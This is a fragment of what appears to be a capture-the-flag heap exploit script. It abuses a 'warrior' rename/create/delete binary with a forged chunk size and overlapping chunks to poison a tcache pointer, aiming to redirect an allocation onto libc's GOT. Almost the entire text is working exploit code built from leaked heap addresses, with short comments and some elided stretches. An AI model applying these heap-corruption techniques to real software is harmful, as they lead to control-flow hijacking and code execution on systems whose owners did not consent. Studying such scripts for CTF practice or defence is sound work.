...
# Addr: 0x55e4925d6070
# prev_size: 0x4f4f4f4f4f4f4f
# size: 0x110 (with flag bits: 0x111)
# fd: 0x55e1cc147bb6
# bk: 0x8a143bb4318c89e5
# fd_nextsize: 0x5050505050505050
# bk_nextsize: 0x5050505050505050

# we want to overwrite above entries fd ptr to get a tcache entry within libc got





rename_warrior(b"W"*0x107, b"W"*0x108)
rename_warrior(b"W"*0x108, b"W"*0x109)



# at heap_leak+0xf60 we have the entry filled with "O" (0x4f), from where we can overwrite the tcache entry for "P" (0x50) at heap_leak+0x1070
fake_size = (heap_leak+0x17e0) - (heap_leak+0xf60+0x10)
payload = b"W"*0x100 + struct.pack('<q', fake_size) + p8(0x10) + p8(0x01)

rename_warrior(b"W"*0x109, payload)
...
#           dunno |              size            |            fd              | bk
payload2 = p64(0) + struct.pack('<q', fake_size) + p64(heap_leak+0xf60) * 2
rename_warrior(b"O"*0x107, payload2+b"O"*(0x108-0x20))
...
input("magic")
delete_warrior(b"W"*0x100)


create_warrior(fake_size-0x20, b";"*0x107)
# now we can overwrite heap_leak+0x1070 to point onto got
